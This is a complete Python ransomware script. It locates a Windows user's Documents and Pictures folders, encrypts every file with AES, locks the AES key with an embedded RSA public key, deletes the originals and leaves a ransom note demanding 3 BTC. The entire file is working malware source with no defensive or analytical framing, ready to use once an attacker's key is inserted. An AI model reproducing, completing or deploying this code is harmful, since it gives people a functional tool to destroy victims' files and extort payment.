import os
import fnmatch
from pathlib import Path
import sys
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

########################
# PASTE YOUR RSA PUBLIC KEY HERE
########################
public_key_pem = b"""-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwdNoJTbDX4UcCKV0OHd9
cvdl+VVR3h0dE2ff19w2/Mieb1fhpRg6S/YJ2JWzrasI8dLHjnkMc93fAISUIK9H
8anWGU2V0EzUIXviNunCyXY908XRTgTsgVy0etPEcrl5XUmZNkHmvUZ7anmP2n9t
QyQKm/puFiXKU8UivsJqE+LeqSHjNEwuBquuH9bhApoL0BcHjxvQwwi+rvIxKPaW
/tavvK5E6DFrC8TOwxjK5f76sPHhfCU21v0LGJ+TSBt8T0215YyUNI+9OX8NHftb
lY2tM+iPP0f1Yp6pUU6oFpQC3Usitn2q4HQiP0xg5HsyWVfin6NT4sCKyMSjHxnT
fwIDAQAB
-----END PUBLIC KEY-----
"""

########################
# AUTO-DETECT FOLDERS (WINDOWS)
########################
user_profile = Path(os.environ["USERPROFILE"])
documents_folder = user_profile / "Documents"
pictures_folder = user_profile / "Pictures"

FOLDERS_TO_ENCRYPT = [
    str(documents_folder),
    str(pictures_folder),
]

########################
# OTHER CONFIG
########################
OUTPUT_KEY_FILENAME = "encrypted_key.bin"
RANSOM_NOTE_FILENAME = "ransom_note.txt"
ENCRYPTED_FILE_EXTENSION = ".enc"

def load_public_key_from_pem(pem_data: bytes):
    return serialization.load_pem_public_key(pem_data)

def encrypt_aes_key_with_rsa(aes_key: bytes, public_key):
    """
    Encrypts the AES key with RSA public key using OAEP + SHA256.
    Returns the RSA-encrypted AES key as bytes.
    """
    return public_key.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

def encrypt_file_with_aes(filepath: str, aes_key: bytes, iv: bytes):
    """
    Encrypts the file (AES CBC + PKCS7-like padding), writes <filename>.enc,
    then deletes the original file.
    """
    with open(filepath, 'rb') as f:
        plaintext = f.read()

    # PKCS7-like padding
    block_size = 16
    pad_length = block_size - (len(plaintext) % block_size)
    plaintext += bytes([pad_length]) * pad_length

    cipher = Cipher(algorithms.AES(aes_key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    encrypted_file_path = filepath + ENCRYPTED_FILE_EXTENSION
    with open(encrypted_file_path, 'wb') as ef:
        ef.write(iv)
        ef.write(ciphertext)

    # Permanently remove the original file
    os.remove(filepath)

def main():
    print("[+] Loading RSA public key...")
    public_key = load_public_key_from_pem(public_key_pem)

    print("[+] Generating random AES key...")
    aes_key = os.urandom(32)  # 256-bit

    print("[+] Encrypting AES key with RSA...")
    encrypted_aes_key = encrypt_aes_key_with_rsa(aes_key, public_key)

    print(f"[+] Saving RSA-encrypted AES key -> {OUTPUT_KEY_FILENAME}")
    with open(OUTPUT_KEY_FILENAME, 'wb') as ekf:
        ekf.write(encrypted_aes_key)

    # Encrypt all files in the detected folders
    for folder in FOLDERS_TO_ENCRYPT:
        if not os.path.exists(folder):
            print(f"[-] Folder does not exist: {folder}")
            continue

        print(f"[+] Searching folder for files: {folder}")
        for root, dirs, files in os.walk(folder):
            for filename in files:
                # Skip if already encrypted
                if filename.endswith(ENCRYPTED_FILE_EXTENSION):
                    continue

                full_path = os.path.join(root, filename)
                print(f"    Encrypting: {full_path}")
                iv = os.urandom(16)
                encrypt_file_with_aes(full_path, aes_key, iv)

    # Write a ransom note (text only)
    ransom_text = (
        "Your files have been encrypted.\n"
        " you send 3 BTC to xoxoxSatoshioxoxox now and you will receive your private key for decrypt. I promise\n"
    )
    with open(RANSOM_NOTE_FILENAME, 'w') as rn:
        rn.write(ransom_text)

    print(f"[+] Ransom note saved as: {RANSOM_NOTE_FILENAME}")
    print("[+] Encryption complete. No pop-up message is displayed.")

if __name__ == "__main__":
    main()
